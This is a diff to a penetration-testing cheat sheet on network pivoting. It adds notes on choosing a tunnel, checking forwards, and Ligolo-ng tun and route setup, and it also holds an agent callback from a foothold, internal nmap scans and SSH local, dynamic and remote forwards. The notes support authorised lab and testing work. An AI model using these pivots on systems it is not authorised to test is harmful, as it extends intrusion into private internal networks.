@@ -1,7 +1,18 @@
 # Tunneling
 
+## Choose the tunnel
+
+- need subnet reachability from Kali: use Ligolo
+- need one localhost-only TCP service: use Ligolo localhost access, or SSH local forward / Windows `portproxy`
+- need app access through an existing shell only: use a targeted forward, not a full tunnel
+
+## Verify every forward
+
+1. check the listener or route exists
+2. connect to the forwarded port from Kali with the intended client
+3. only then continue enumeration through it
+
 ## Ligolo-ng workflow
-```text
 1. Start proxy on Kali.
 2. In the Ligolo console, create the tun interface.
 3. Run the agent on the foothold.
@@ -9,9 +20,15 @@
 5. In the Ligolo console, check the foothold subnet.
 6. Add the route from the Ligolo console.
 7. Scan from Kali with `-sT` / `--unprivileged`.
-```
 
 # Kali
+
+## Create and bring up the tun interface
+Run this first if Ligolo cannot create the interface for you.
+```bash
+sudo ip tuntap add user "$(whoami)" mode tun ligolo
+sudo ip link set ligolo up
+```
 
 ## Start proxy
 ```bash
@@ -21,12 +38,12 @@
 # Ligolo Console
 
 ## Create the tun interface
-```text
+```bash
 interface_create --name ligolo
 ```
 
 ## Show the TLS fingerprint
-```text
+```bash
 certificate_fingerprint
 ```
 
@@ -45,20 +62,26 @@ agent.exe -connect <KALI-IP>:11601 -ignore-cert
 # Ligolo Console
 
 ## Select the session
-```text
+```bash
 session
 session <id>
 ```
 
 ## Start the tunnel
-```text
+```bash
 tunnel_start --tun ligolo
 ifconfig
 ```
 
 ## Add the route
-```text
+```bash
 interface_add_route --name ligolo --route <subnet from ifconfig>
+```
+
+## Access the current agent localhost with Ligolo
+Ligolo maps `240.0.0.0/4` to the current agent `127.0.0.1`.
+```bash
+sudo ip route add 240.0.0.1/32 dev ligolo
 ```
 
 # Kali
@@ -66,7 +89,7 @@ interface_add_route --name ligolo --route <subnet from ifconfig>
 ## Scan through the tunnel
 ```bash
 nmap -sn <subnet from ifconfig>
-nmap -Pn -n --unprivileged -sT 172.16.5.10
+nmap -Pn -n --unprivileged -sT <target-ip>
 ```
 
 ## Local port forward with SSH
@@ -95,9 +118,4 @@ ssh -D 9050 user@<foothold>
 ## Remote port forward with SSH
 ```bash
 ssh -R 8080:127.0.0.1:80 user@<foothold>
-```
-
-## Rule
-```text
-If a useful service binds to 127.0.0.1 and you already have shell access, expose it immediately before chasing other paths.
 ```
